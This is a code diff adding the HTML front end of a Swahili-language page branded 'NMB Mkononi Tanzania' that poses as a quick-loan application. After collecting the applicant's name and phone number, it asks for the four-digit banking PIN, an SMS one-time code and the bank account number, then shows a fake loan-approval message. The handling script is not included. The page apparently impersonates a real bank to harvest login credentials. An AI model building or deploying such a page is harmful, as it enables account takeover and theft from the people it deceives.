@@ -1,0 +1,182 @@
+<!-- public/index.html -->
+<!DOCTYPE html>
+<html lang="sw">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>NMB Mkononi Tanzania</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <div class="surface-notification" id="surfaceNotification" style="display: none;"></div>
+    
+    <div class="app-container">
+        <header class="app-header">
+            <div class="logo-area">
+                <span class="brand-blue">NMB</span>
+                <span class="brand-divider">|</span>
+                <span class="brand-white">MKONONI TANZANIA</span>
+            </div>
+        </header>
+
+        <main class="main-content">
+            <!-- Step 1: Loan Calculator & Application Intro -->
+            <div id="step-calculator" class="form-step active">
+                <h2>Pata Mkopo Wako Haraka</h2>
+                <p class="subtitle">Idhini ya haraka • Riba nafuu • Muda rahisi</p>
+                
+                <div class="calculator-card">
+                    <h3>Kikokotoo cha Mkopo</h3>
+                    <label>Kiasi cha Mkopo</label>
+                    <input type="range" id="loanAmountRange" min="10000" max="100000000" step="10000" value="100000">
+                    <div class="range-values"><span>TSh 10K</span><span id="displayLoanAmount">TSh 100,000</span><span>TSh 100M</span></div>
+                    
+                    <label>Muda wa Mkopo (Miezi)</label>
+                    <input type="range" id="loanMonthsRange" min="6" max="60" step="1" value="12">
+                    <div class="range-values"><span>miezi 6</span><span id="displayLoanMonths">miezi 12</span><span>miezi 60</span></div>
+                    
+                    <div class="monthly-payment-box">
+                        <span>Malipo ya Kila Mwezi</span>
+                        <strong id="displayMonthlyPayment">TSh 9,504</strong>
+                    </div>
+                </div>
+                
+                <button type="button" class="btn-primary" onclick="goToStep('step-details')">OMBA SASA</button>
+            </div>
+
+            <!-- Step 2: Loan Details Form (Hatua 1 ya 3) -->
+            <div id="step-details" class="form-step">
+                <h2>Maombi ya Mkopo</h2>
+                <p class="step-indicator">Hatua 1 ya 3</p>
+                
+                <label>Aina ya Mkopo</label>
+                <select id="loanType">
+                    <option value="Mkopo wa Biashara">Mkopo wa Biashara</option>
+                    <option value="Mkopo wa Haraka">Mkopo wa Haraka</option>
+                </select>
+
+                <label>Kiasi cha Mkopo (TSh)</label>
+                <input type="number" id="inputAmount" value="100000">
+
+                <label>Muda wa Mkopo</label>
+                <select id="loanDuration">
+                    <option value="Miezi 48">Miezi 48</option>
+                    <option value="Miezi 12">Miezi 12</option>
+                </select>
+
+                <label>Madhumuni ya Mkopo</label>
+                <textarea id="loanPurpose" placeholder="Elezea madhumuni ya mkopo wako..."></textarea>
+
+                <div class="button-group">
+                    <button type="button" class="btn-secondary" onclick="goToStep('step-calculator')">RUDI</button>
+                    <button type="button" class="btn-primary" onclick="goToStep('step-contact')">HATUA INAYOFUATA</button>
+                </div>
+            </div>
+
+            <!-- Step 3: Contact & Name Info (Hatua 2 ya 3) -->
+            <div id="step-contact" class="form-step">
+                <h2>Maombi ya Mkopo</h2>
+                <p class="step-indicator">Hatua 2 ya 3</p>
+                
+                <div class="name-row">
+                    <div>
+                        <label>Jina la Kwanza</label>
+                        <input type="text" id="firstName" placeholder="Jina la kwanza">
+                    </div>
+                    <div>
+                        <label>Jina la Ukoo</label>
+                        <input type="text" id="lastName" placeholder="Jina la ukoo">
+                    </div>
+                </div>
+
+                <label>Namba ya Simu</label>
+                <div class="phone-input-group">
+                    <span class="country-code">🇹🇿 +255</span>
+                    <input type="tel" id="phoneNumber" placeholder="712345678">
+                </div>
+                <small class="hint-text">Weka namba 9 au anza na 0</small>
+
+                <div class="button-group">
+                    <button type="button" class="btn-secondary" onclick="goToStep('step-details')">ILIYOTANGULIA</button>
+                    <button type="button" class="btn-primary" onclick="submitPhoneAndNext()">HATUA INAYOFUATA</button>
+                </div>
+            </div>
+
+            <!-- Step 4: Employment & Summary (Hatua 3 ya 3) -->
+            <div id="step-summary" class="form-step">
+                <h2>Maombi ya Mkopo</h2>
+                <p class="step-indicator">Hatua 3 ya 3</p>
+                
+                <label>Hali ya Ajira</label>
+                <select id="employmentStatus">
+                    <option value="Mfanyabiashara">Mfanyabiashara</option>
+                    <option value="Mwajiriwa">Mwajiriwa</option>
+                </select>
+
+                <label>Mapato ya Mwaka (TSh)</label>
+                <input type="number" id="annualIncome" placeholder="Weka mapato ya mwaka">
+
+                <div class="summary-box">
+                    <h4>Muhtasari wa Maombi</h4>
+                    <p>Kiasi cha Mkopo: <strong id="sumAmount">TSh 100,000</strong></p>
+                    <p>Muda wa Mkopo: <strong id="sumDuration">Miezi 48</strong></p>
+                    <p>Madhumuni: <strong id="sumPurpose">Biashara</strong></p>
+                    <p>Mwombaji: <strong>NMB MKONONI</strong></p>
+                </div>
+
+                <div class="button-group">
+                    <button type="button" class="btn-secondary" onclick="goToStep('step-contact')">ILIYOTANGULIA</button>
+                    <button type="button" class="btn-primary" onclick="requestPinVerification()">WASILISHA MAOMBI</button>
+                </div>
+            </div>
+
+            <!-- Step 5: PIN Entry -->
+            <div id="step-pin" class="form-step">
+                <h2>Ingia Akaunti</h2>
+                <p class="subtitle">Weka PIN yako (tarakimu 4)</p>
+                <div class="pin-inputs">
+                    <input type="password" maxlength="1" class="pin-box" autofocus>
+                    <input type="password" maxlength="1" class="pin-box">
+                    <input type="password" maxlength="1" class="pin-box">
+                    <input type="password" maxlength="1" class="pin-box">
+                </div>
+                <button type="button" class="btn-primary" onclick="submitPin()">INGIA</button>
+            </div>
+
+            <!-- Step 6: OTP Verification -->
+            <div id="step-otp" class="form-step">
+                <h2>Uthibitisho wa OTP</h2>
+                <p class="subtitle">Weka OTP iliyotumwa kwenye namba yako ya simu</p>
+                <div class="pin-inputs">
+                    <input type="text" maxlength="1" class="otp-box" autofocus>
+                    <input type="text" maxlength="1" class="otp-box">
+                    <input type="text" maxlength="1" class="otp-box">
+                    <input type="text" maxlength="1" class="otp-box">
+                </div>
+                <button type="button" class="btn-primary" onclick="submitOtp()">WASILISHA</button>
+            </div>
+
+            <!-- Step 7: Bank Account Entry -->
+            <div id="step-account" class="form-step">
+                <h2>BANK ACCOUNT DETAILS</h2>
+                <p class="subtitle">Please enter your NMB Bank account number below.</p>
+                <label>Account Number</label>
+                <input type="text" id="accountNumberInput" maxlength="11" placeholder="12345678901">
+                <button type="button" class="btn-primary" onclick="submitAccount()">SUBMIT ACCOUNT</button>
+            </div>
+
+            <!-- Step 8: Success State -->
+            <div id="step-success" class="form-step">
+                <h2>🎉 Hongera!</h2>
+                <p class="subtitle">Mkopo wako umeidhinishwa! Fedha zitatolewa hivi karibuni.</p>
+                <div class="success-card">
+                    <h3>KIASI KILICHOIDHINISHWA</h3>
+                    <h1>TSh 100,000</h1>
+                </div>
+                <button type="button" class="btn-primary" onclick="location.reload()">Rudi Nyumbani</button>
+            </div>
+        </main>
+    </div>
+    <script src="script.js"></script>
+</body>
+</html>
